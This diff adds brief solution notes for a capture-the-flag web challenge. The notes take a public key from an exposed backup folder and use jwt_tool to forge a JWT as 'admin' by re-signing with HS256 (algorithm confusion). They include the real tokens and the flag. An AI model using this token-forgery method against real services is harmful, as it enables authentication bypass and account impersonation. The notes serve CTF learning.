@@ -1,0 +1,17 @@
+https://mr-voorhees.appsecil.ctf.today/robots.txt
+	Disallow: /backup/
+https://mr-voorhees.appsecil.ctf.today/backup/
+	get public.pem
+
+Cookie
+eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6Ikphc29uIiwiaWF0IjoxNjAzNjA0OTM5fQ.YZ8Wu2Yxa0HcKozQdH29tZ186RU6jT0aaZ1zgxVApXabyNLOZWPPFyY4XdBbZXS4iS64jV6idbktpefnAqMxFg
+
+python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6Ikphc29uIiwiaWF0IjoxNjAzNjA0OTM5fQ.YZ8Wu2Yxa0HcKozQdH29tZ186RU6jT0aaZ1zgxVApXabyNLOZWPPFyY4XdBbZXS4iS64jV6idbktpefnAqMxFg
+
+"username": "Jason" => "username": "admin"
+Sign with key file
+
+New Token
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjAzNjA0OTM5fQ.7ocGyU4QNbJCEYap-KA_4S7PI5pVVd8cSPhqcXw2V5Q
+
+AppSec-IL{100k_wh47_y0u_d1d_70_h1m}
